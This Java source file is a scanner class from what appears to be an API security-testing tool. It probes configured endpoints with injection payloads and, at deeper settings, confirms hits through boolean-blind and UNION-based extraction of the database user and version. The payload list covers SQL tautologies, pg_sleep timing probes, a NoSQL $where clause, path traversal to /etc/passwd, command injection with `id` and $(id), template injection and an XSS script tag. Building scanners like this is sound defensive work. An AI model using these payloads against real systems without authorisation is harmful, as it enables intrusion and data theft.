package ru.apidefender.scanners.owasp;

import okhttp3.MediaType;
import okhttp3.RequestBody;
import okhttp3.Response;
import ru.apidefender.core.report.ReportModel;
import ru.apidefender.scanners.SPI;

import java.nio.charset.StandardCharsets;
import java.time.Duration;
import java.util.*;
import java.util.concurrent.CompletableFuture;

public class InjectionScanner implements SPI {
    @Override public String getCategory() { return "Injection"; }

    private static final List<String> PAYLOADS = List.of(
            "' OR 1=1--",
            "\" OR 1=1--",
            "') OR '1'='1",
            "'||(SELECT 1)||'",
            "; sleep(2); --",
            "1; SELECT pg_sleep(2); --",
            "'; SELECT pg_sleep(2); --",
            "';select pg_sleep(2);--",
            "1); SELECT pg_sleep(2); --",
            "'||(SELECT CASE WHEN (1=1) THEN pg_sleep(2) ELSE 0 END)::text||'",
            "' UNION SELECT pg_sleep(2)::text --",
            "1; DO $$ BEGIN PERFORM pg_sleep(2); END $$; --",
            "'||CAST(pg_sleep(2) AS text)||'",
            "admin'--",
            "{" + "\"$where\": \"this.a == this.a\"}" ,
            "../../etc/passwd",
            "`id`",
            "$(id)",
            "| id",
            "${7*7}",
            "<script>alert(1)</script>"
    );

    private static final List<String> ERROR_SIGNS = List.of(
            "SQL syntax", "ORA-", "SQLSTATE", "MongoError", "PSQLException", "org.postgresql", "syntax error at or near",
            "unterminated quoted string", "invalid input syntax for type", "relation \"", "XPathException", "Stack trace"
    );

    @Override
    public CompletableFuture<Void> run(ScanContext ctx) {
        return CompletableFuture.runAsync(() -> {
            int maxOps = ctx.injectionOps;
            int tested = 0;
            for (String p : ctx.endpoints) {
                if (tested++ >= maxOps) break;
                String base = ctx.url(p);
                // тестируем GET c query param
                for (String payload : PAYLOADS) {
                    String url = base + (base.contains("?")? "&": "?") + "q=" + java.net.URLEncoder.encode(payload, StandardCharsets.UTF_8);
                    long t0 = System.nanoTime();
                    try (Response r = ctx.http.request("GET", url, null, null)) {
                        long dt = (System.nanoTime()-t0)/1_000_000L;
                        String body = r.peekBody(200_000).string();
                        boolean error = ERROR_SIGNS.stream().anyMatch(s -> body.contains(s));
                        boolean timing = (payload.toLowerCase().contains("pg_sleep") || payload.toLowerCase().contains("sleep")) && dt > 1500;
                        if (error || timing) {
                            ReportModel.SecurityIssue si = new ReportModel.SecurityIssue();
                            si.id = UUID.randomUUID().toString();
                            si.category = getCategory();
                            si.severity = timing? "High" : "Medium";
                            si.endpoint = p;
                            si.method = "GET";
                            si.description = timing? "Подозрение на time-based инъекцию" : "Подозрение на ошибку при инъекции";
                            si.evidence = "payload="+payload+", latencyMs="+dt;
                            si.impact = "Возможное выполнение произвольных запросов/команд";
                            // попытка углубления: boolean-blind и безопасный union-экстракт
                            StringBuilder notes = new StringBuilder();
                            if (!"low".equalsIgnoreCase(ctx.exploitDepth)) {
                                tryExploitBooleanImproved(ctx, base, p, notes);
                                if ("med".equalsIgnoreCase(ctx.exploitDepth) || "high".equalsIgnoreCase(ctx.exploitDepth)) {
                                    Integer cc = InjectionUtils.detectOrderByColumns(ctx, base);
                                    if (cc != null && cc > 0) {
                                        InjectionUtils.tryUnionExtractWithColumnCount(ctx, base, p, notes, cc);
                                    } else if ("high".equalsIgnoreCase(ctx.exploitDepth)) {
                                        tryUnionExtract(ctx, base, p, notes);
                                    }
                                }
                            }
                            si.recommendation = "Фильтрация/экранирование входных данных, prepared statements";
                            si.traceRef = ctx.traceSaver.save(url, "GET", null, r);
                            if (notes.length()>0) si.description += "; Подтверждение: "+notes;
                            synchronized (ctx.report.security){ ctx.report.security.add(si);} 
                            break;
                        }
                    } catch (Exception ignored) {}
                }

                // POST JSON c инъекциями
                Map<String,Object> obj = new LinkedHashMap<>();
                obj.put("q", PAYLOADS.get(0));
                obj.put("name", "test"+PAYLOADS.get(3));
                String json = toJson(obj);
                try (Response r = ctx.http.request("POST", base, Map.of("Content-Type","application/json"),
                        RequestBody.create(json, MediaType.parse("application/json")))) {
                    String body = r.peekBody(200_000).string();
                    boolean error = ERROR_SIGNS.stream().anyMatch(body::contains);
                    if (error) {
                        ReportModel.SecurityIssue si = new ReportModel.SecurityIssue();
                        si.id = UUID.randomUUID().toString();
                        si.category = getCategory();
                        si.severity = "Medium";
                        si.endpoint = p;
                        si.method = "POST";
                        si.description = "Подозрение на инъекцию через тело запроса";
                        si.evidence = body.length() > 300? body.substring(0,300): body;
                        si.impact = "Возможное выполнение произвольных запросов/команд";
                        si.recommendation = "Валидация/экранирование, ограничение ошибок";
                        si.traceRef = ctx.traceSaver.save(base, "POST", json, r);
                        if (!"low".equalsIgnoreCase(ctx.exploitDepth)) {
                            StringBuilder notes = new StringBuilder();
                            tryExploitBoolean(ctx, base, p, notes);
                            si.description += notes.length()>0? "; Подтверждение: "+notes: "";
                        }
                        synchronized (ctx.report.security){ ctx.report.security.add(si);} 
                    }
                } catch (Exception ignored) {}

                // Header injection
                try (Response r = ctx.http.request("GET", base, Map.of("X-Injection-Test", PAYLOADS.get(0)), null)) {
                    String body = r.peekBody(200_000).string();
                    boolean error = ERROR_SIGNS.stream().anyMatch(body::contains);
                    if (error) {
                        ReportModel.SecurityIssue si = new ReportModel.SecurityIssue();
                        si.id = UUID.randomUUID().toString();
                        si.category = getCategory();
                        si.severity = "Medium";
                        si.endpoint = p;
                        si.method = "GET";
                        si.description = "Подозрение на инъекцию через заголовок";
                        si.evidence = "header=X-Injection-Test";
                        si.impact = "Манипуляции логикой через заголовки";
                        si.recommendation = "Санитизация и белые списки заголовков";
                        si.traceRef = ctx.traceSaver.save(base, "GET", null, r);
                        synchronized (ctx.report.security){ ctx.report.security.add(si);} 
                    }
                } catch (Exception ignored) {}
            }
        });
    }

    private String toJson(Map<String,Object> map){
        try { return new com.fasterxml.jackson.databind.ObjectMapper().writeValueAsString(map);} catch (Exception e){return "{}";}
    }

    // Improved boolean-blind confirmation using status + token-similarity
    private void tryExploitBooleanImproved(ScanContext ctx, String base, String p, StringBuilder out){
        if (ctx.maxExploitOps <= 0) return;
        String url1 = base + (base.contains("?")? "&": "?") + "bb=1' AND 1=1 --";
        String url2 = base + (base.contains("?")? "&": "?") + "bb=1' AND 1=2 --";
        try (Response r1 = ctx.http.request("GET", url1, null, null);
             Response r2 = ctx.http.request("GET", url2, null, null)) {
            int c1 = r1.code();
            int c2 = r2.code();
            String b1 = r1.peekBody(40_000).string();
            String b2 = r2.peekBody(40_000).string();
            boolean codeDiff = c1 != c2;
            boolean lenDiff = Math.abs(b1.length()-b2.length()) > (b1.length()*0.2 + 50);
            double sim = ru.apidefender.scanners.owasp.InjectionUtils.jaccardSimilarity(b1, b2);
            boolean textDiff = sim < 0.70;
            if (codeDiff || lenDiff || textDiff) {
                out.append("boolean-blind подтверждён (различие ответов)");
            }
        } catch (Exception ignored) {}
    }

    private void tryExploitBoolean(ScanContext ctx, String base, String p, StringBuilder out){
        if (ctx.maxExploitOps <= 0) return;
        String url1 = base + (base.contains("?")? "&": "?") + "bb=1' AND 1=1 --";
        String url2 = base + (base.contains("?")? "&": "?") + "bb=1' AND 1=2 --";
        try (Response r1 = ctx.http.request("GET", url1, null, null);
             Response r2 = ctx.http.request("GET", url2, null, null)) {
            String b1 = r1.peekBody(40_000).string();
            String b2 = r2.peekBody(40_000).string();
            if (Math.abs(b1.length()-b2.length()) > (b1.length()*0.2 + 50)) {
                out.append("boolean-blind подтверждён (ответы различаются)");
            }
        } catch (Exception ignored) {}
    }

    private void tryUnionExtract(ScanContext ctx, String base, String p, StringBuilder out){
        if (ctx.maxExploitOps <= 0) return;
        String url = base + (base.contains("?")? "&": "?") + "u=' UNION SELECT current_user --";
        try (Response r = ctx.http.request("GET", url, null, null)) {
            String body = r.peekBody(80_000).string();
            if (body.contains("postgres") || body.toLowerCase().contains("user")) {
                out.append(", union‑extract: current_user в ответе");
            }
        } catch (Exception ignored) {}
        String url2 = base + (base.contains("?")? "&": "?") + "u=' UNION SELECT version() --";
        try (Response r = ctx.http.request("GET", url2, null, null)) {
            String body = r.peekBody(80_000).string();
            if (body.toLowerCase().contains("postgresql")) {
                out.append(", version извлечена");
            }
        } catch (Exception ignored) {}
    }
}
